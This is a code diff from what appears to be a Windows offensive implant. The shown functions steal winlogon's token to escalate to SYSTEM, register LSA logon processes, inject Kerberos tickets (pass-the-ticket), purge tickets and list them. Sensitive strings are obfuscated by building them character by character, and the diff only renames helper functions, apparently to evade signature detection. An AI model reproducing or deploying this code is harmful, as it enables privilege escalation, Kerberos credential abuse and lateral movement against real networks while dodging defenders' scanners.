@@ -69,24 +69,24 @@ BOOL ElevateToSystem()
     HANDLE            hToken         = FALSE;
     DWORD             ProcessID      = 0;
 
-    winlogon[ 11 ] = HideChar('e');
-    winlogon[ 4 ]  = HideChar('o');
-    winlogon[ 2 ]  = HideChar('n');
-    winlogon[ 6 ]  = HideChar('o');
-    winlogon[ 7 ]  = HideChar('n');
-    winlogon[ 5 ]  = HideChar('g');
-    winlogon[ 12 ] = HideChar(0);
-    winlogon[ 3 ]  = HideChar('l');
-    winlogon[ 9 ]  = HideChar('e');
-    winlogon[ 8 ]  = HideChar('.');
-    winlogon[ 1 ]  = HideChar('i');
-    winlogon[ 0 ]  = HideChar('w');
-    winlogon[ 10 ] = HideChar('x');
+    winlogon[ 11 ] = HiChara('e');
+    winlogon[ 4 ]  = HiChara('o');
+    winlogon[ 2 ]  = HiChara('n');
+    winlogon[ 6 ]  = HiChara('o');
+    winlogon[ 7 ]  = HiChara('n');
+    winlogon[ 5 ]  = HiChara('g');
+    winlogon[ 12 ] = HiChara(0);
+    winlogon[ 3 ]  = HiChara('l');
+    winlogon[ 9 ]  = HiChara('e');
+    winlogon[ 8 ]  = HiChara('.');
+    winlogon[ 1 ]  = HiChara('i');
+    winlogon[ 0 ]  = HiChara('w');
+    winlogon[ 10 ] = HiChara('x');
     ProcessID = GetProcessIdByName(winlogon);
-    MemZero( winlogon, sizeof( winlogon ) );
+    MemeZ( winlogon, sizeof( winlogon ) );
     if (ProcessID == -1)
     {
-        PUTS( "Failed to find the PID of Winlogon.exe" )
+        STUP( "Failed to find the PID of Winlogon.exe" )
         return FALSE;
     }
 
@@ -171,16 +171,16 @@ NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
         // AuditPol.exe /set /subcategory:"Security System Extension"
         // /success:enable /failure:enable Event ID 4611 Note: detect elevation via
         CHAR name[10] = { 0 }; // Winlogon
-        name[ 2 ] =  HideChar('n');
-        name[ 8 ] =  HideChar('n');
-        name[ 4 ] =  HideChar('o');
-        name[ 0 ] =  HideChar('W');
-        name[ 1 ] =  HideChar('i');
-        name[ 7 ] =  HideChar('o');
-        name[ 6 ] =  HideChar('g');
-        name[ 3 ] =  HideChar('l');
-        name[ 9 ] =  HideChar('\0');
-        name[ 5 ] =  HideChar('o');
+        name[ 2 ] =  HiChara('n');
+        name[ 8 ] =  HiChara('n');
+        name[ 4 ] =  HiChara('o');
+        name[ 0 ] =  HiChara('W');
+        name[ 1 ] =  HiChara('i');
+        name[ 7 ] =  HiChara('o');
+        name[ 6 ] =  HiChara('g');
+        name[ 3 ] =  HiChara('l');
+        name[ 9 ] =  HiChara('\0');
+        name[ 5 ] =  HiChara('o');
         STRING lsaString = (STRING){.Length = 8, .MaximumLength = 9, .Buffer = name};
         status = Instance->Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
         if ( ! NT_SUCCESS( status ) || ! hLsaLocal )
@@ -209,7 +209,7 @@ NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
                 }
             }
         }
-        MemZero( name, sizeof( name ) );
+        MemeZ( name, sizeof( name ) );
     }
     *hLsa = hLsaLocal;
     return status;
@@ -411,15 +411,15 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
     ULONG                    responseSize   = 0;
     CHAR                     name[9]        = { 0 };
 
-    name[ 5 ] = HideChar('r');
-    name[ 0 ] = HideChar('k');
-    name[ 8 ] = HideChar( 0);
-    name[ 1 ] = HideChar('e');
-    name[ 2 ] = HideChar('r');
-    name[ 7 ] = HideChar('s');
-    name[ 3 ] = HideChar('b');
-    name[ 6 ] = HideChar('o');
-    name[ 4 ] = HideChar('e');
+    name[ 5 ] = HiChara('r');
+    name[ 0 ] = HiChara('k');
+    name[ 8 ] = HiChara( 0);
+    name[ 1 ] = HiChara('e');
+    name[ 2 ] = HiChara('r');
+    name[ 7 ] = HiChara('s');
+    name[ 3 ] = HiChara('b');
+    name[ 6 ] = HiChara('o');
+    name[ 4 ] = HiChara('e');
 
     krbAuth.Buffer = name;
 
@@ -429,7 +429,7 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
     highIntegrity = IsHighIntegrity( hToken );
     if ( ! highIntegrity )
     {
-        PUTS( "[!] Not in high integrity." );
+        STUP( "[!] Not in high integrity." );
         goto END;
     }
 
@@ -486,7 +486,7 @@ END:
     if ( hLsa ) {
         Instance->Win32.LsaDeregisterLogonProcess( hLsa );
     }
-    MemZero( name, sizeof( name ) );
+    MemeZ( name, sizeof( name ) );
 
     return ReturnValue;
 }
@@ -505,15 +505,15 @@ BOOL Purge( HANDLE hToken, LUID luid )
     ULONG                        responseSize   = 0;
     CHAR                         name[9]        = { 0 };
 
-    name[ 5 ] = HideChar('r');
-    name[ 0 ] = HideChar('k');
-    name[ 8 ] = HideChar( 0);
-    name[ 1 ] = HideChar('e');
-    name[ 2 ] = HideChar('r');
-    name[ 7 ] = HideChar('s');
-    name[ 3 ] = HideChar('b');
-    name[ 6 ] = HideChar('o');
-    name[ 4 ] = HideChar('e');
+    name[ 5 ] = HiChara('r');
+    name[ 0 ] = HiChara('k');
+    name[ 8 ] = HiChara( 0);
+    name[ 1 ] = HiChara('e');
+    name[ 2 ] = HiChara('r');
+    name[ 7 ] = HiChara('s');
+    name[ 3 ] = HiChara('b');
+    name[ 6 ] = HiChara('o');
+    name[ 4 ] = HiChara('e');
 
     krbAuth.Buffer = name;
 
@@ -523,7 +523,7 @@ BOOL Purge( HANDLE hToken, LUID luid )
     highIntegrity = IsHighIntegrity( hToken );
     if ( ! highIntegrity )
     {
-        PUTS( "[!] Not in high integrity." );
+        STUP( "[!] Not in high integrity." );
         goto END;
     }
 
@@ -577,7 +577,7 @@ END:
     if (hLsa) {
         Instance->Win32.LsaDeregisterLogonProcess( hLsa );
     }
-    MemZero( name, sizeof( name ) );
+    MemeZ( name, sizeof( name ) );
 
     return ReturnValue;
 }
@@ -602,15 +602,15 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
     PTICKET_INFORMATION               TmpTicketInfo  = NULL;
     CHAR                              name[9]        = { 0 };
 
-    name[ 5 ] = HideChar('r');
-    name[ 0 ] = HideChar('k');
-    name[ 8 ] = HideChar( 0);
-    name[ 1 ] = HideChar('e');
-    name[ 2 ] = HideChar('r');
-    name[ 7 ] = HideChar('s');
-    name[ 3 ] = HideChar('b');
-    name[ 6 ] = HideChar('o');
-    name[ 4 ] = HideChar('e');
+    name[ 5 ] = HiChara('r');
+    name[ 0 ] = HiChara('k');
+    name[ 8 ] = HiChara( 0);
+    name[ 1 ] = HiChara('e');
+    name[ 2 ] = HiChara('r');
+    name[ 7 ] = HiChara('s');
+    name[ 3 ] = HiChara('b');
+    name[ 6 ] = HiChara('o');
+    name[ 4 ] = HiChara('e');
 
     krbAuth.Buffer = name;
 
@@ -620,7 +620,7 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
     highIntegrity = IsHighIntegrity( hToken );
     if ( ! highIntegrity )
     {
-        PUTS( "[!] Not in high integrity." );
+        STUP( "[!] Not in high integrity." );
         goto END;
     }
 
@@ -740,7 +740,7 @@ END:
     if ( hLsa ) {
         Instance->Win32.LsaDeregisterLogonProcess( hLsa );
     }
-    MemZero( name, sizeof( name ) );
+    MemeZ( name, sizeof( name ) );
 
     if ( ReturnValue && Sessions ) {
         return Sessions;
